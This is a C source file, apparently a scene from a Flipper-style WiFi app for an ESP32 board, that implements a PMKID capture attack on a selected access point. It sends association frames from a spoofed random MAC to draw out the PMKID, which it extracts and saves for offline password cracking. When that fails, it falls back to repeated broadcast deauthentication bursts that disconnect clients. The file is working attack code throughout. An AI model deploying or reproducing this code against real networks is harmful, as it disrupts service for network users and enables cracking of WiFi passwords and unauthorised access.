#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_handshake_parser.h"
#include "../wlan_pmkid_out.h"
#include "../pmkid_frames.h"
#include "../views/wlan_pmkid_view.h"
#include <esp_timer.h>
#include <storage/storage.h>
#include <string.h>

#define TAG "WlanPmkid"

/* Timing (driven from the scene-manager Tick handler — no furi_delay_ms here). */
#define PMK_ASSOC_RETRY_MS   800
#define PMK_FALLBACK_AFTER_MS 9000
#define PMK_MAX_ATTEMPTS     10
#define PMK_FALLBACK_BURST_INTERVAL_MS 3000

/* Deauth burst (fallback), same template as the handshake scene. */
static const uint8_t pmk_deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00,
};

/* Small dedicated ring buffer (do NOT share the handshake scene's statics). */
#define PMK_POOL_SIZE 24
#define PMK_PKT_MAX   512
typedef struct {
    uint16_t len;
    uint8_t data[PMK_PKT_MAX];
} PmkPkt;

static PmkPkt* s_pool = NULL;
static volatile uint32_t s_w = 0;
static volatile uint32_t s_r = 0;

/* Guards the capture pool against a concurrent free() in on_exit while the
 * WiFi RX task is inside pmk_rx_cb. See docs/.../p5-concurrency-hardening. */
static portMUX_TYPE s_pmk_pool_mux = portMUX_INITIALIZER_UNLOCKED;

static uint8_t s_bssid[6];
static uint8_t s_own_mac[6];
static char s_ssid[33];
static uint8_t s_channel;
static Storage* s_storage = NULL;

static PmkidState s_state;
static uint32_t s_attempts;
static uint32_t s_state_since_ms;
static uint32_t s_last_retry_ms;
static uint32_t s_last_burst_ms;
static bool s_have_pmkid;
static uint8_t s_pmkid[16];

static uint32_t now_ms(void) {
    return (uint32_t)(esp_timer_get_time() / 1000);
}

static const WlanApRecord* pmk_pick_target(const WlanApp* app) {
    if(app->target_ap.ssid[0]) return &app->target_ap;
    if(app->connected) return &app->connected_ap;
    return NULL;
}

/* Promiscuous RX: keep only EAPOL data frames whose BSSID matches the target.
 * Guard the NULL pool (RX task can fire after free / before alloc). */
static void pmk_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    UNUSED(type);
    if(!s_pool) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if(len < 24 || len > PMK_PKT_MAX) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    if(((fc & 0x0C) >> 2) != 2) return; /* data frames only */
    int hdr_len = 24;
    uint8_t to_ds = (fc & 0x0100) >> 8;
    uint8_t from_ds = (fc & 0x0200) >> 9;
    if(to_ds && from_ds) hdr_len = 30;
    uint8_t subtype = (fc & 0xF0) >> 4;
    if((subtype & 0x08) == 0x08) hdr_len += 2;
    if(len < hdr_len + 8) return;
    const uint8_t* llc = &payload[hdr_len];
    if(!(llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E)) return;

    portENTER_CRITICAL(&s_pmk_pool_mux);
    if(s_pool) {                       /* authoritative re-check under the lock */
        uint32_t next = (s_w + 1) % PMK_POOL_SIZE;
        if(next != s_r) {
            memcpy(s_pool[s_w].data, payload, len);
            s_pool[s_w].len = (uint16_t)len;
            s_w = next;
        }
    }
    portEXIT_CRITICAL(&s_pmk_pool_mux);
}

/* Returns true if a fresh, non-zero PMKID for our target was captured+saved. */
static bool pmk_drain(void) {
    bool got = false;
    while(s_r != s_w) {
        PmkPkt* p = &s_pool[s_r];
        const uint8_t* payload = p->data;
        int len = p->len;
        const uint8_t* bssid = NULL;
        const uint8_t* station = NULL;
        const uint8_t* ap = NULL;
        int header_len = 0;
        if(wlan_hs_parse_addresses(payload, len, &bssid, &station, &ap, &header_len) &&
           memcmp(bssid, s_bssid, 6) == 0 && wlan_hs_is_eapol(payload, header_len, len)) {
            const uint8_t* eapol = &payload[header_len + 8];
            int eapol_len = len - header_len - 8;
            if(wlan_hs_get_eapol_msg_num(eapol, eapol_len) == 1 && !s_have_pmkid) {
                uint8_t pmkid[16];
                if(wlan_hs_extract_pmkid(eapol, eapol_len, pmkid)) {
                    memcpy(s_pmkid, pmkid, 16);
                    s_have_pmkid = true;
                    wlan_pmkid_save(s_storage, pmkid, s_bssid, station ? station : s_own_mac, s_ssid);
                    FURI_LOG_I(TAG, "PMKID captured: %s", s_ssid);
                    got = true;
                }
            }
        }
        s_r = (s_r + 1) % PMK_POOL_SIZE;
    }
    return got;
}

static void pmk_inject_assoc(void) {
    uint8_t frame[128];
    size_t n = pmkid_build_auth_open(frame, sizeof(frame), s_bssid, s_own_mac);
    if(n) wlan_hal_send_raw(frame, (uint16_t)n);
    n = pmkid_build_assoc_req(frame, sizeof(frame), s_bssid, s_own_mac, s_ssid);
    if(n) wlan_hal_send_raw(frame, (uint16_t)n);
    s_attempts++;
}

static void pmk_deauth_burst(void) {
    uint8_t f[26];
    memcpy(f, pmk_deauth_tmpl, 26);
    memcpy(&f[10], s_bssid, 6);
    memcpy(&f[16], s_bssid, 6);
    for(int i = 0; i < 8; i++) wlan_hal_send_raw(f, 26);
}

static void pmk_set_state(PmkidState st) {
    s_state = st;
    s_state_since_ms = now_ms();
}

static void pmk_publish(WlanApp* app) {
    WlanPmkidViewModel* m = view_get_model(app->view_pmkid);
    strncpy(m->ssid, s_ssid, sizeof(m->ssid) - 1);
    m->ssid[sizeof(m->ssid) - 1] = 0;
    memcpy(m->bssid, s_bssid, 6);
    m->channel = s_channel;
    m->state = s_state;
    m->attempts = s_attempts;
    m->have_pmkid = s_have_pmkid;
    if(s_have_pmkid) {
        for(int i = 0; i < 16; i++) snprintf(m->pmkid_hex + i * 2, 3, "%02x", s_pmkid[i]);
    }
    view_commit_model(app->view_pmkid, true);
}

void wlan_app_scene_pmkid_on_enter(void* context) {
    WlanApp* app = context;
    s_w = 0;
    s_r = 0;
    s_attempts = 0;
    s_have_pmkid = false;
    memset(s_pmkid, 0, sizeof(s_pmkid));
    if(!s_pool) s_pool = malloc(sizeof(PmkPkt) * PMK_POOL_SIZE);

    const WlanApRecord* t = pmk_pick_target(app);
    if(t) {
        memcpy(s_bssid, t->bssid, 6);
        strncpy(s_ssid, t->ssid, sizeof(s_ssid) - 1);
        s_ssid[sizeof(s_ssid) - 1] = 0;
        s_channel = t->channel ? t->channel : 1;
    } else {
        memset(s_bssid, 0, 6);
        s_ssid[0] = 0;
        s_channel = 1;
    }

    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();
    wlan_hal_random_mac(s_own_mac); /* spoofed LAA src — never leak the real device MAC */
    wlan_hal_set_channel(s_channel);
    s_storage = furi_record_open(RECORD_STORAGE);

    wlan_hal_set_promiscuous(true, pmk_rx_cb);
    pmk_set_state(PmkidStateAssociating);
    if(t) pmk_inject_assoc();
    pmk_set_state(PmkidStateWaiting);
    s_last_retry_ms = now_ms();
    pmk_publish(app);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewPmkid);
}

bool wlan_app_scene_pmkid_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    if(event.type != SceneManagerEventTypeTick) return false;

    if(s_have_pmkid) {
        if(s_state != PmkidStateCaptured) {
            wlan_hal_set_promiscuous(false, NULL);
            pmk_set_state(PmkidStateCaptured);
        }
        pmk_publish(app);
        return false;
    }

    if(pmk_drain()) {
        wlan_hal_set_promiscuous(false, NULL);
        pmk_set_state(PmkidStateCaptured);
        pmk_publish(app);
        return false;
    }

    if(s_state == PmkidStateWaiting) {
        uint32_t since_state = now_ms() - s_state_since_ms; /* fallback clock (not reset by retries) */
        if(since_state >= PMK_FALLBACK_AFTER_MS) {
            pmk_set_state(PmkidStateFallback);
            /* Fire the first burst promptly on the first Fallback tick. */
            s_last_burst_ms = now_ms() - PMK_FALLBACK_BURST_INTERVAL_MS;
        } else if(now_ms() - s_last_retry_ms >= PMK_ASSOC_RETRY_MS && s_attempts < PMK_MAX_ATTEMPTS) {
            pmk_inject_assoc();
            s_last_retry_ms = now_ms(); /* only the retry clock is reset */
        }
    } else if(s_state == PmkidStateFallback) {
        if(now_ms() - s_last_burst_ms >= PMK_FALLBACK_BURST_INTERVAL_MS) {
            pmk_deauth_burst();
            s_last_burst_ms = now_ms(); /* leave a quiet window for reconnects */
        }
    }
    pmk_publish(app);
    return false;
}

void wlan_app_scene_pmkid_on_exit(void* context) {
    UNUSED(context);
    wlan_hal_set_promiscuous(false, NULL);
    pmk_drain();
    if(s_storage) {
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
    }
    /* NULL the pointer under the lock so any RX callback that acquires the mux
     * after this point sees s_pool == NULL and skips; a callback already inside
     * the critical section completes before we capture+free here. */
    PmkPkt* pool_to_free;
    portENTER_CRITICAL(&s_pmk_pool_mux);
    pool_to_free = s_pool;
    s_pool = NULL;
    portEXIT_CRITICAL(&s_pmk_pool_mux);
    if(pool_to_free) free(pool_to_free);
    s_w = 0;
    s_r = 0;
    s_have_pmkid = false;
    s_last_retry_ms = 0;
    s_last_burst_ms = 0;
}
